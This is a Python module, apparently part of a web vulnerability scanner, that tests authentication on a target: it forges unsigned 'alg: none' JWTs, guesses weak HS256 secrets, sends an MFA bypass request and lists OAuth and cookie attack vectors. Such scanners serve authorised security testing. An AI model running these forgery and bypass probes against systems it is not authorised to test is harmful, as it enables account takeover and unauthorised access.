"""Authentication and Session vulnerability analyzer - Enhanced JWT testing."""

import logging
import base64
import json
from typing import Any

import httpx

logger = logging.getLogger(__name__)


class JWTTester:
    """Test JWT tokens for algorithm none, weak secrets, and header manipulation."""

    @staticmethod
    async def test_alg_none(
        token: str, endpoint: str, base_url: str = ""
    ) -> dict[str, Any]:
        """Test JWT 'alg: none' algorithm injection."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return {"vulnerable": False}

            # Modify header to alg: none
            header = json.loads(base64.b64decode(parts[0] + "=="))
            header["alg"] = "none"
            new_header = (
                base64.b64encode(json.dumps(header).encode()).decode().rstrip("=")
            )

            # Remove signature
            manipulated_token = f"{new_header}.{parts[1]}."

            # Test with manipulated token
            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.get(
                    f"{base_url}{endpoint}",
                    headers={"Authorization": f"Bearer {manipulated_token}"},
                )

                if response.status_code == 200:
                    return {
                        "vulnerable": True,
                        "type": "jwt_alg_none",
                        "severity": "CRITICAL",
                        "details": "Server accepts alg:none JWT - no signature verification",
                    }
        except Exception:
            pass

        return {"vulnerable": False, "type": "jwt_alg_none"}

    @staticmethod
    async def test_weak_secret(token: str) -> dict[str, Any]:
        """Test JWT for weak signature secrets."""
        try:
            import jwt as pyjwt

            parts = token.split(".")
            if len(parts) != 3:
                return {"vulnerable": False}

            # Try common weak secrets
            weak_secrets = [
                "secret",
                "password",
                "123456",
                "key",
                "jwt_secret",
                "reconx",
            ]

            for secret in weak_secrets:
                try:
                    decoded = pyjwt.decode(token, secret, algorithms=["HS256"])
                    return {
                        "vulnerable": True,
                        "type": "jwt_weak_secret",
                        "severity": "CRITICAL",
                        "details": f"JWT signed with weak secret: {secret}",
                        "payload": decoded,
                    }
                except Exception:
                    continue
        except ImportError:
            pass

        return {"vulnerable": False, "type": "jwt_weak_secret"}


class MFABypassTester:
    """Test MFA bypass via response manipulation."""

    @staticmethod
    async def test_mfa_bypass(
        endpoint: str, base_url: str = "", token: str = ""
    ) -> dict[str, Any]:
        """Test if MFA can be bypassed by modifying response."""
        try:
            headers = {"Authorization": f"Bearer {token}"} if token else {}

            async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
                response = await client.post(
                    f"{base_url}{endpoint}",
                    json={"mfa_code": "000000", "bypass": True},
                    headers=headers,
                )

                response_json = (
                    response.json()
                    if "application/json" in response.headers.get("Content-Type", "")
                    else {}
                )

                # Check if response can be manipulated
                if response_json.get("success") or response.status_code == 200:
                    if "mfa" not in str(response_json).lower() or response_json.get(
                        "bypassed"
                    ):
                        return {
                            "vulnerable": True,
                            "type": "mfa_bypass",
                            "severity": "HIGH",
                            "details": "MFA verification can be bypassed",
                        }
        except Exception:
            pass

        return {"vulnerable": False, "type": "mfa_bypass"}


async def analyze_auth_session(
    endpoints: list[dict[str, Any]],
    tech_profile: dict[str, list[str]],
    headers: dict[str, str],
    model_router: Any,
    base_url: str = "",
    token: str = "",
) -> dict[str, Any]:
    """Analyze for auth and session vulnerabilities with enhanced JWT testing."""
    findings = {
        "jwt_endpoints": [],
        "oauth_endpoints": [],
        "weak_auth": [],
        "jwt_vulnerabilities": [],
    }

    tech_str = " ".join(str(v) for vals in tech_profile.values() for v in vals).lower()

    # JWT testing
    if "jwt" in tech_str and token:
        jwt_endpoints = [
            e
            for e in endpoints
            if "login" in e.get("path", "").lower()
            or "auth" in e.get("path", "").lower()
        ]

        for ep in jwt_endpoints:
            path = ep.get("path", "/auth")

            # Test alg: none
            alg_none_result = await JWTTester.test_alg_none(token, path, base_url)
            if alg_none_result.get("vulnerable"):
                findings["jwt_vulnerabilities"].append(alg_none_result)

            # Test weak secret
            weak_secret_result = await JWTTester.test_weak_secret(token)
            if weak_secret_result.get("vulnerable"):
                findings["jwt_vulnerabilities"].append(weak_secret_result)

            findings["jwt_endpoints"].append(
                {
                    "endpoint": path,
                    "test": "Extract JWT, test alg:none and weak secrets",
                    "vectors": [
                        "Algorithm confusion (HS256 vs RS256)",
                        "Weak signature key",
                        '"alg": "none" injection',
                        "Missing key verification",
                        "Header manipulation (kid, jwk)",
                    ],
                }
            )

    # OAuth testing
    if "oauth" in tech_str:
        findings["oauth_endpoints"] = [
            {
                "endpoint": e.get("path"),
                "test": "Check redirect_uri validation, state parameter, PKCE",
                "vectors": [
                    "Open redirect in OAuth flow",
                    "Missing state parameter",
                    "Weak state validation",
                    "PKCE bypass",
                    "Token leakage via Referer",
                ],
            }
            for e in endpoints
            if "oauth" in e.get("path", "").lower()
            or "authorize" in e.get("path", "").lower()
        ]

    # MFA bypass testing
    if token and base_url:
        for ep in endpoints:
            if (
                "mfa" in ep.get("path", "").lower()
                or "2fa" in ep.get("path", "").lower()
            ):
                mfa_result = await MFABypassTester.test_mfa_bypass(
                    ep.get("path", "/mfa/verify"), base_url, token
                )
                if mfa_result.get("vulnerable"):
                    findings["weak_auth"].append(mfa_result)

    # Session cookie analysis
    if headers:
        cookie_header = headers.get("Cookie", "")
        if "session" in cookie_header.lower():
            findings["weak_auth"].append(
                {
                    "issue": "Session cookie detected",
                    "test": "Check Secure, HttpOnly, SameSite flags",
                    "vectors": [
                        "Missing Secure flag",
                        "Missing HttpOnly flag",
                        "Missing SameSite restriction",
                        "Session fixation",
                    ],
                }
            )

    return {
        "vulnerability": "Auth / Session",
        "jwt_findings": findings["jwt_endpoints"],
        "jwt_vulnerabilities": findings["jwt_vulnerabilities"],
        "oauth_findings": findings["oauth_endpoints"],
        "weak_auth_findings": findings["weak_auth"],
        "total_issues": (
            len(findings["jwt_endpoints"])
            + len(findings["jwt_vulnerabilities"])
            + len(findings["oauth_endpoints"])
            + len(findings["weak_auth"])
        ),
    }
